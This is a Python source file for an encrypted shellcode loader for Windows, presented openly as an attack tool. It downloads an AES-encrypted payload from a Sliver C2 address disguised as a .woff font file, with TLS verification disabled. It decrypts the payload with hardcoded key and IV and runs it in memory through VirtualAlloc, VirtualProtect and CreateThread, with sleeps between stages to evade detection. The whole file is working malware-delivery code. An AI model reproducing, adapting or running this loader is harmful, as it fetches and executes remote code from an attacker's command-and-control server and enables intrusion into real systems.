# flake8: noqa

import argparse
import ctypes
import logging
import ssl
import time
import urllib.request
from ctypes import wintypes

from Crypto.Cipher import AES

# Windows API function definitions
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = wintypes.LPVOID
VirtualAlloc.argtypes = [
    wintypes.LPVOID,
    ctypes.c_size_t,
    wintypes.DWORD,
    wintypes.DWORD,
]

VirtualProtect = kernel32.VirtualProtect
VirtualProtect.restype = wintypes.BOOL
VirtualProtect.argtypes = [
    wintypes.LPVOID,
    ctypes.c_size_t,
    wintypes.DWORD,
    wintypes.PDWORD,
]

CreateThread = kernel32.CreateThread
CreateThread.restype = wintypes.HANDLE
CreateThread.argtypes = [
    wintypes.LPVOID,
    ctypes.c_size_t,
    wintypes.LPVOID,
    wintypes.LPVOID,
    wintypes.DWORD,
    wintypes.LPDWORD,
]

WaitForSingleObject = kernel32.WaitForSingleObject
WaitForSingleObject.restype = wintypes.DWORD
WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]


CloseHandle = kernel32.CloseHandle
CloseHandle.restype = wintypes.BOOL
CloseHandle.argtypes = [wintypes.HANDLE]


RtlMoveMemory = ntdll.RtlMoveMemory
RtlMoveMemory.restype = None
RtlMoveMemory.argtypes = [wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t]

# Constants
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20


# Convert key and IV to UTF-8 byte arrays and ensure they are 16 bytes
def pad_key(key, size=16):
    return (key.encode("utf-8") + b"\0" * size)[:size]


def decrypt_aes(ciphertext, key, iv):
    logging.debug("Starting AES decryption")
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        logging.debug(
            f"Decryption successful. Decrypted data length: {len(decrypted)} bytes"
        )
        return decrypted
    except Exception as e:
        logging.error(f"Decryption failed: {e}")
        raise


def download_content(url):
    logging.debug(f"Downloading content from {url}")
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with urllib.request.urlopen(url, context=context) as response:
            content = response.read()
            logging.info(f"Download successful. Content length: {len(content)} bytes")
            return content
    except Exception as e:
        logging.error(f"Download failed: {e}")
        raise


def execute_shellcode(shellcode, sleep_time):
    logging.debug("Preparing to execute shellcode")
    try:
        # Allocate buffer for payload
        addr = VirtualAlloc(
            None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )
        if not addr:
            raise ctypes.WinError()
        logging.info(f"Memory allocated at address: {addr}")

        time.sleep(sleep_time)

        # Copy shellcode to allocated memory
        RtlMoveMemory(addr, shellcode, len(shellcode))
        logging.debug("Shellcode copied to allocated memory")

        # Make the buffer executable
        old_protect = wintypes.DWORD()
        if not VirtualProtect(
            addr, len(shellcode), PAGE_EXECUTE_READ, ctypes.byref(old_protect)
        ):
            raise ctypes.WinError()
        logging.debug("Memory protection changed to PAGE_EXECUTE_READ")

        time.sleep(sleep_time)

        # Create and execute thread
        thread_id = wintypes.DWORD()
        thread = CreateThread(None, 0, addr, None, 0, ctypes.byref(thread_id))
        if not thread:
            raise ctypes.WinError()
        logging.info(f"Thread created with handle: {thread}")

        WaitForSingleObject(thread, 0xFFFFFFFF)
        CloseHandle(thread)
        logging.info("Thread execution completed")
    except Exception as e:
        logging.error(f"Shellcode execution failed: {e}")
        raise


def main():
    parser = argparse.ArgumentParser(description="Encrypted Shellcode Injection")
    parser.add_argument(
        "--url",
        default="<Sliver C2>/files.woff",
        help="C2 URL to download shellcode",
    )
    parser.add_argument(
        "--aes-key",
        default="D(G+KbPeShVmYq4t",
        help="AES decryption key",
    )
    parser.add_argument(
        "--aes-iv",
        default="8y/B?E(G+KbPeShV",
        help="AES IV",
    )
    parser.add_argument(
        "--sleep",
        type=int,
        default=4,
        help="Delay in seconds between stages",
    )
    args = parser.parse_args()

    # Set up logging
    logging.basicConfig(
        level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s"
    )

    aes_key_bytes = pad_key(args.aes_key)
    aes_iv_bytes = pad_key(args.aes_iv)
    logging.info(f"AES Key length: {len(aes_key_bytes)} bytes")
    logging.info(f"AES IV length: {len(aes_iv_bytes)} bytes")

    try:
        logging.info("Starting shellcode loader")
        encrypted_content = download_content(args.url)
        logging.debug(f"Encrypted content length: {len(encrypted_content)} bytes")

        encrypted_shellcode = encrypted_content[16:]
        logging.debug(
            f"Encrypted shellcode length (after skipping 16 bytes): {len(encrypted_shellcode)} bytes"
        )

        shellcode = decrypt_aes(encrypted_shellcode, aes_key_bytes, aes_iv_bytes)
        logging.info(f"Decrypted shellcode length: {len(shellcode)} bytes")

        execute_shellcode(shellcode, args.sleep)
        logging.info("Shellcode execution completed successfully")
    except Exception as e:
        logging.error(f"An error occurred: {e}")


if __name__ == "__main__":
    main()
